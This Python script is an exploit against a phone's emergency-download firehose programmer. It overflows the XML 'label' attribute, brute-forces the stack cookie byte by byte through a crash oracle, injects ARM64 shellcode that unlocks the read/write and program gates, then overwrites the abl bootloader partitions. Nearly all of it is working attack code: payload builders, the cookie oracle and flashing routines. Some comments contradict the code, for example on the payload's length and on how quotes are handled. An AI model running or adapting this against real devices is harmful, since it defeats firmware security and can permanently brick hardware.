#!/usr/bin/env python3
"""exec_label.py — same-session RCE from the `<read label>` overflow.

Supersedes the "one-slot / one-shot" conclusion in docs/CHAIN_NOTES.md.
The missing premise was that the stack address is unknown. It is not:
the programmer sets `sp` to a **fixed** literal at entry.

    entry 0x149997c8  mov  sp, #0                      -> sp = 0
    0x14999824        ldr  x0, =0x149de000
    0x14999828        mov  sp, x0                      -> sp = 0x149de000   FIXED
    0x14999c78        sub  sp, sp, #0x20               -> sp = 0x149ddfe0
    0x149a1e78        sub  sp, sp, #0x60   (loop frame) sp = 0x149ddf80   = SP_L
    0x149a41a4        sub  sp, sp, #0x160  (read frame) sp = 0x149dde20
    0x149a41bc        add  x29, sp, #0x110            x29 = 0x149ddf30
    dst = x29-0x50                                   dst = 0x149ddee0   FIXED

Consequences:

1. The label lands at a *known* address, so **the label is code**. Write shellcode
   into dst+0, redirect saved x30 to dst, and the handler `ret`s into it.
2. The handler epilogue runs `add sp,sp,#0x160` *before* `ret`
   (0x149a42e8), so at the moment our code executes, sp == SP_L again —
   exactly the value the dispatcher loop expects.
3. Therefore `b 0x149a1fc0` continues the loop as if the handler had returned
   normally. The session survives. flag1 set this way **persists**.
4. 0x149a1f94 is the resync entry: it re-opens the RX buffer and reloads
   x19/x20..x23, so the loop's invariants hold.

Byte constraint. Every byte of the label must be NUL-free (XML attribute +
strlen). `mov w0,#1` encodes 20 00 80 52 and contains a NUL. Use
`mov w0,#0x101` = 20 20 80 52 — NUL-free, and non-zero, so the flag1 setter's
`cset ne` still stores 1.

Payload (three words at dst):
    dst+0x00  20 20 80 52   mov w0, #0x101
    dst+0x04  bl 0x149aabd0  set_flag1(1)         (bl sets x30 = dst+8)
    dst+0x08  b  0x149a1f94  resync + return to the dispatcher loop

Still gated by the cookie: bytes 0..7 of the payload precede the cookie slot at
dst+0x48, so the cookie must be reproduced verbatim at dst+0x48 (8 bytes, all
NUL-free), then 8 filler bytes for saved x29, then the last 4 payload bytes at
dst+0x58 are the low dword of dst. The formatter's NUL lands at dst+0x5C, which
is byte 4 of saved x30; the original bytes 5..7 there are 00 00 00, so
saved x30 == 0x00000000149ddee0.

Everything hinges on the cookie being recoverable. `--stage probe` decides which
kind of unit this is; `--stage oracle` recovers it; `--stage arm` fires.

STAGES
  probe   One label that reproduces the shipped constant's low half. Answer =>
          cookie is the shipped 0x00000000C0C0C0C0 (a NUL sits mid-value, the
          exec trick is impossible on this unit). Silence => live entropy.
  oracle  Byte-by-byte cookie recovery. Each wrong guess parks the CPU in
          spin-loop 0x149a006c (USB stays enumerated, session dead). Resumable
          from cookie.bin.
  arm     The real thing: cookie + payload -> flag1 := 1, session keeps running.
  flash   After a successful arm: program abl_a/abl_b from the local image.

Run `--dry-run` first. Never run oracle/arm on hardware you cannot power-cycle.
"""
from __future__ import annotations

import argparse
import os
import struct
import sys
import time

import fhcore
from fhcore import log, log_raw

# ---------------------------------------------------------------- fixed geometry
DST = 0x149DDEE0          # x29 - 0x50 with sp pinned by the entry literal
SP_L = 0x149DDF80         # loop frame sp; restored by the handler epilogue
OFF_CANARY = 0x48
OFF_X29 = 0x50
OFF_X30 = 0x58
LABEL_LEN = 0x5C          # payload ends at dst+0x5C (formatter NUL lands there)

# ---------------------------------------------------------------- code constants
NOP = 0xD503201F          # first word: NUL-free and not 0x20, so the payload
                          # survives even if the parser trims leading spaces
MOV_W0_101 = 0x52802020   # mov w0, #0x101   (NUL-free encoding of "non-zero")
SET_FLAG1 = 0x149AABD0    # cmp w0,#0 ; strb w9,[x8,#0xbc0] ; ret
SET_FLAG3 = 0x149AABF0    # cmp w0,#0 ; strb w9,[x8,#0x648] ; ret  (program's 2nd gate)
RESYNC = 0x149A1F94       # add x0,sp,#8 ; bl rx_open ; mov x19,x0 ; reload table

DEFAULT_IMAGES = os.environ.get("EDL_IMAGE_DIR", "./IMAGES/")
DEFAULT_ELF = os.path.join(DEFAULT_IMAGES, "prog_firehose_ddr.elf")
DEFAULT_ABL = os.environ.get("ABL_IMG", os.path.join(DEFAULT_IMAGES, "abl.elf"))
COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookie.bin")

SECTOR = 4096
ABL_A = dict(lun=4, start=98310, nsec=68)      # digest wants sha256(abl.elf + pad)
ABL_B = dict(lun=4, start=458038, nsec=68)


# ---------------------------------------------------------------- encodings
def _bl(site: int, target: int) -> int:
    d = (target - site) // 4
    assert -0x2000000 <= d < 0x2000000, "bl out of range"
    return 0x94000000 | (d & 0x3FFFFFF)


def _b(site: int, target: int) -> int:
    d = (target - site) // 4
    assert -0x2000000 <= d < 0x2000000, "b out of range"
    return 0x14000000 | (d & 0x3FFFFFF)


def payload_words(armed: bool) -> list[int]:
    """nop ; mov w0,#0x101 [; bl set_flag1] ; b resync.

    Unarmed variant is the oracle/robustness probe: it only proves that the
    label executed and the loop was rejoined, without touching flag1.
    """
    w = [NOP, MOV_W0_101]
    if armed:
        w.append(_bl(DST + 8, SET_FLAG1))    # flag1  (read/write total gate)
        w.append(MOV_W0_101)                 # re-arm w0: never rely on a callee
        w.append(_bl(DST + 16, SET_FLAG3))   # flag3  (program/sha256 second gate)
        w.append(_b(DST + 20, RESYNC))
    else:
        w.append(_b(DST + 8, RESYNC))
    return w


def code_bytes(armed: bool) -> bytes:
    return b"".join(struct.pack("<I", w) for w in payload_words(armed))


def build_label(cookie: bytes, armed: bool = True) -> bytes:
    code = code_bytes(armed)
    assert len(code) <= OFF_CANARY
    if len(cookie) != 8:
        raise ValueError("cookie must be 8 bytes")
    if 0 in cookie:
        raise ValueError(
            "cookie contains a NUL byte — the label cannot carry it, so the "
            "exec trick is impossible on this unit"
        )
    # A raw 0x22 in the cookie closes the attribute early (no entity decoding),
    # and everything after the quote would have to be legal XML again — which
    #  and  are not. So when the cookie carries a quote the label is
    # cut at dst+0x47 and ends with that quote: the copy stops short of the
    # cookie, the cookie keeps its already-equal contents, and the tail is the
    # self-closing "/>". x30 is then NOT written (see EXEC_NOTES §7).
    quoted = b'"' in cookie
    if quoted and cookie[0] == 0x22:
        label = code + b"A" * (0x47 - len(code)) + b'"'
    else:
        label = code + b"A" * (OFF_CANARY - len(code)) + cookie + b"J" * 8
        label += DST.to_bytes(8, "little")[:4]
    if not quoted:
        assert len(label) == LABEL_LEN, hex(len(label))
    if b"\x00" in label:
        raise ValueError("label NUL: %s" % label.hex())
    # The parser does not entity-decode attribute values (the "&quot" literal in
    # the image is only used by the log formatter), so only '&' and '<'/'&gt;'
    # shapes are genuinely unsafe. A raw '"' inside the value is tolerated up to
    # the point where the scanner stops, which is all a fixed-length label needs:
    # the copy still runs with the full strlen-derived length.
    for bad in b"&<":
        if bytes([bad]) in label:
            raise ValueError("label has XML-significant byte %r" % bytes([bad]))
    return label


def probe_label() -> bytes:
    """Reproduce the shipped cookie's low half; the formatter NUL lands on byte 4,
    bytes 5..7 already hold their original zeros => all 8 compare equal iff the
    cookie really is 0x00000000C0C0C0C0."""
    return b"A" * OFF_CANARY + b"\xc0\xc0\xc0\xc0"


def oracle_label(prefix: bytes, guess: int) -> bytes:
    """Filler to the canary, the known prefix, then one guessed byte.

    The length must be 0x48 + len(prefix) + 1 so the copy ends inside the cookie
    slot: bytes 0..i are compared, bytes i+1..7 keep their original values.
    """
    if guess == 0:
        raise ValueError("guess 0 terminates the label — unprowable")
    if len(prefix) > 8:
        raise ValueError("prefix too long")
    return b"A" * OFF_CANARY + prefix + bytes([guess])


def read_xml(label: bytes) -> bytes:
    head = (
        '<?xml version="1.0" ?><data><read SECTOR_SIZE_IN_BYTES="4096" '
        'num_partition_sectors="1" physical_partition_number="0" '
        'start_sector="0" label="'
    ).encode()
    # A raw 0x22 inside the value closes the attribute early (the parser does no
    # entity decoding), so when the payload carries one the closing quote is
    # supplied by the payload itself and everything after it must read as XML.
    # The bytes after the cookie are `01*7 'J'*8 <dst>`; they form one valueless
    # attribute, which is legal, and ` />` then ends the element.
    if b'"' in label and label.endswith(b'"'):
        # the label's own trailing quote closed the attribute; "/>" self-closes
        # <read> with no separating space (the parser wants '/' right at x1)
        return head + label + b"/></data>"
    return head + label + b'" /></read></data>' 


# ---------------------------------------------------------------- liveness
def alive(session, timeout: float = 1.5):
    """True when the dispatcher answers. A parked CPU raises on write (the
    endpoint ACKs nothing), so a write exception counts as dead."""
    try:
        resp = session.send('<?xml version="1.0" ?><data><nop /></data>', timeout)
    except Exception:
        return False, b""
    return (b"ACK" in resp or b"NAK" in resp), resp


def probe_flag1(session):
    resp = session.send('<?xml version="1.0" ?><data><getbasicdata /></data>', 1.5)
    if b"ACK" in resp:
        return True
    if b"NAK" in resp or b"not allowed" in resp:
        return False
    return None


# ---------------------------------------------------------------- flash primitives
def read_sectors(session, lun, start, nsec, timeout=60):
    xml = (
        '<?xml version="1.0" ?><data><read SECTOR_SIZE_IN_BYTES="%d" label="probe" '
        'num_partition_sectors="%d" physical_partition_number="%d" '
        'start_sector="%d" /></data>' % (SECTOR, nsec, lun, start)
    ).encode()
    session.port.write(xml)
    buf, data, raw = b"", b"", False
    t0 = time.time()
    while time.time() - t0 < timeout:
        d = session.port.read(0x400000)
        if not d:
            time.sleep(0.01)
            continue
        if not raw:
            buf += d
            if b'rawmode="true"' in buf:
                raw = True
                i = buf.find(b"</data>")
                if i != -1:
                    data = buf[i + 7:]
                    buf = buf[: i + 7]
            elif b"NAK" in buf:
                return None, buf
        else:
            data += d
            if len(data) >= nsec * SECTOR:
                return data[: nsec * SECTOR], buf
    return (data or None), buf


def program_sectors(session, lun, start, nsec, payload, label, timeout=600):
    assert len(payload) == nsec * SECTOR
    xml = (
        '<?xml version="1.0" ?><data><program SECTOR_SIZE_IN_BYTES="%d" label="%s" '
        'num_partition_sectors="%d" physical_partition_number="%d" '
        'start_sector="%d" /></data>' % (SECTOR, label, nsec, lun, start)
    ).encode()
    session.port.write(xml)
    time.sleep(0.5)
    r = session.drain(1.0)
    if b'rawmode="true"' not in r and b"NAK" in r:
        return None, r
    pos = 0
    while pos < len(payload):
        session.port.write(payload[pos:pos + 512 * 1024])
        pos += 512 * 1024
        time.sleep(0.02)
    resp, t0 = b"", time.time()
    while time.time() - t0 < timeout:
        d = session.port.read(0x100000)
        if d:
            resp += d
            if b"<response" in resp and (b"ACK" in resp or b"NAK" in resp):
                break
        else:
            time.sleep(0.05)
    ok = b"ACK" in resp and b"NAK" not in resp
    return ok, resp


def transfercfg(session, reboot_type: str, secs: int = 10):
    xml = (
        '<?xml version="1.0" ?><data><transfercfg reboot_type="%s" '
        'timeout_in_sec="%d" /></data>' % (reboot_type, secs)
    ).encode()
    resp = session.send(xml, 1.0)
    return (b"ACK" in resp and b"NAK" not in resp), resp


# ---------------------------------------------------------------- stages
def stage_probe(session):
    log("probe: label carries the shipped cookie's low half")
    log_raw("RX", session.send(read_xml(probe_label()), 2.0))
    time.sleep(0.3)
    up, _ = alive(session)
    if up:
        log("*** session survived -> cookie == shipped 0x00000000C0C0C0C0")
        log("    a NUL sits mid-value, so the 8-byte cookie cannot be carried by a")
        log("    label. On this unit the overflow stays a crash primitive.")
    else:
        log("*** session silent -> cookie is live entropy. Recover it with --stage oracle")
        log("    after a power cycle. If it turns out NUL-free the exec path applies.")
    return up


def load_cookie():
    if not os.path.exists(COOKIE_FILE):
        return b""
    return open(COOKIE_FILE, "rb").read()


def stage_oracle(session):
    known = bytearray(load_cookie())
    if len(known) == 8:
        log("cookie already fully recovered: %s" % bytes(known).hex())
        return bytes(known)
    log("oracle: %d/8 bytes known" % len(known))
    while len(known) < 8:
        i = len(known)
        hit = False
        for guess in range(1, 256):
            log("  byte %d guess %#04x" % (i, guess))
            session.send(read_xml(oracle_label(bytes(known), guess)), 1.2)
            time.sleep(0.2)
            up, _ = alive(session)
            if up:
                log("    hit -> byte %d == %#04x" % (i, guess))
                known.append(guess)
                open(COOKIE_FILE, "wb").write(bytes(known))
                hit = True
                break
            log("    miss, session parked -> power-cycle, replug, rerun --stage oracle")
            return bytes(known)
        if not hit:
            log("byte %d: all 255 non-zero guesses missed -> the byte is 0x00." % i)
            log("A NUL mid-value ends the label early, so saved x30 is unreachable:")
            log("the overflow is crash-only on this unit. Nothing more to do here.")
            return bytes(known)
    log("cookie recovered: %s" % bytes(known).hex())
    return bytes(known)


def stage_arm(session, cookie: bytes, armed: bool = True):
    if len(cookie) != 8:
        log("need a full 8-byte cookie (have %d) — run --stage oracle" % len(cookie))
        return 1
    label = build_label(cookie, armed)
    if b'"' in cookie and cookie[0] == 0x22:
        log("note: cookie starts with 0x22 — the value ends at that quote, so the")
        log("      label stops at dst+0x47 and saved x30 is NOT written. The")
        log("      command still runs and the session survives (canary-exact).")
    log("arm: label %#x bytes, saved x30 -> %#x, %s"
        % (len(label), DST, "flag1+resync" if armed else "resync only"))
    log_raw("TX", read_xml(label))
    session.send(read_xml(label), 1.5)
    time.sleep(0.4)
    up, _ = alive(session, 2.5)
    if not up:
        log("session died — either the cookie is wrong or .bss is not executable.")
        log("a dead session needs a power cycle; cookie.bin is unchanged.")
        return 2
    log("*** session alive after exec — the label ran and the loop was rejoined")
    if not armed:
        return 0
    f1 = probe_flag1(session)
    log("getbasicdata -> %s" % ("ACK: flag1=1, WRITE UNLOCKED" if f1 else str(f1)))
    return 0 if f1 else 3


def stage_flash(session):
    abl_path = os.environ.get("ABL_IMG", DEFAULT_ABL)
    if not os.path.exists(abl_path):
        log("abl image missing: %s" % abl_path)
        return 1
    abl = open(abl_path, "rb").read()
    nsec = (len(abl) + SECTOR - 1) // SECTOR
    if nsec != ABL_A["nsec"]:
        log("warning: image is %d sectors, digest expects %d" % (nsec, ABL_A["nsec"]))
    pad = abl + b"\x00" * (nsec * SECTOR - len(abl))

    if probe_flag1(session) is not True:
        log("flag1 is 0 — run --stage arm first")
        return 2

    log("safety net: transfercfg reset_to_edl")
    log("  -> %s" % (transfercfg(session, "reset_to_edl", 10),))

    log("self-test: program 1 sector 0xFF into abl_b")
    ok, resp = program_sectors(session, ABL_B["lun"], ABL_B["start"], 1,
                               b"\xff" * SECTOR, "abl_b", timeout=120)
    log("  -> %s %r" % (ok, (resp or b"")[-140:]))
    if not ok:
        log("program still gated — abort")
        return 3

    for name, p in (("abl_b", ABL_B), ("abl_a", ABL_A)):
        log("program %s (LUN%d s%d, %d sectors)" % (name, p["lun"], p["start"], nsec))
        ok, resp = program_sectors(session, p["lun"], p["start"], nsec, pad, name, 900)
        log("  -> %s %r" % (ok, (resp or b"")[-140:]))
        if not ok:
            return 4

    d, _ = read_sectors(session, ABL_A["lun"], ABL_A["start"], 1)
    if d:
        log("abl_a readback %s -> %s" % (d[:4].hex(),
                                         "STILL MZ" if d[:2] == b"MZ" else "ELF/ok"))
    log("clear safety net")
    log("  -> %s" % (transfercfg(session, "none", 1),))
    session.send('<?xml version="1.0" ?><data><power Value="reset" /></data>', 1.0)
    log("done — device reset")
    return 0


# ---------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port")
    ap.add_argument("--elf", default=DEFAULT_ELF)
    ap.add_argument("--images", default=DEFAULT_IMAGES)
    ap.add_argument("--stage", required=True,
                    choices=("probe", "oracle", "arm", "arm-noflag", "flash", "info"))
    ap.add_argument("--mode-type", type=int, default=5)
    ap.add_argument("--attach", action="store_true",
                    help="talk to an already-running programmer (skip Sahara)")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    if args.stage == "info":
        print("DST   %#x" % DST)
        print("SP_L  %#x" % SP_L)
        print("len   %#x" % LABEL_LEN)
        print("probe label : %s" % probe_label().hex())
        ck = load_cookie() or b"\xc0" * 8
        if len(ck) == 8 and 0 not in ck:
            print("arm   label : %s" % build_label(ck).hex())
            print("            %s" % read_xml(build_label(ck)).decode("latin1"))
        else:
            print("cookie unusable for arm: %s" % ck.hex())
        return

    if args.dry_run:
        print(read_xml(probe_label()).decode("latin1"))
        return

    fw = fhcore.load(args.elf)
    log("binary match: %s" % fw.verify_identity())
    cfg = fhcore.LiveConfig(port=args.port, image_dir=args.images)
    try:
        session, portname = fhcore.open_live_session(
            cfg, send_digest=True, mode_type=args.mode_type, attach=args.attach)
    except fhcore.BinaryError as e:
        log("no live session: %s" % e)
        log("(900E on the port list means crashdump, not EDL — hold power ~10 s,")
        log(" then replug and check for a 9008 port)")
        sys.exit(9)
    log("session on %s" % portname)
    try:
        if args.stage == "probe":
            stage_probe(session)
        elif args.stage == "oracle":
            stage_oracle(session)
        elif args.stage == "arm":
            sys.exit(stage_arm(session, load_cookie(), True))
        elif args.stage == "arm-noflag":
            sys.exit(stage_arm(session, load_cookie(), False))
        elif args.stage == "flash":
            sys.exit(stage_flash(session))
    finally:
        session.close()


if __name__ == "__main__":
    main()
